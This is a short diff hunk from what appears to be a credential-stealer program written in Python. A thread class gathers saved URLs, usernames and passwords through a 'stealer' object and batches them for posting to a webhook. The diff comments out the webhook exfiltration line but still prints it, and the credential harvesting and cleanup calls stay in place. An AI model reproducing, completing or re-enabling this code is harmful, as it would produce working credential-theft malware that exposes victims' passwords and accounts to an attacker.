@@ -137,7 +137,7 @@ class ExtraThread(QThread):
         for url, username, password in stealer.get_credentials(): 
             text += f"{url} > {username} > {password}\n"
             if text.count("\n") > 20:
-                post(webhook, data={"content": f"```{text}```"})
+                # post(webhook, data={"content": f"```{text}```"})
                 text = ""
         stealer.save_and_clean()
         # post(webhook, data={"content": "- "*10})
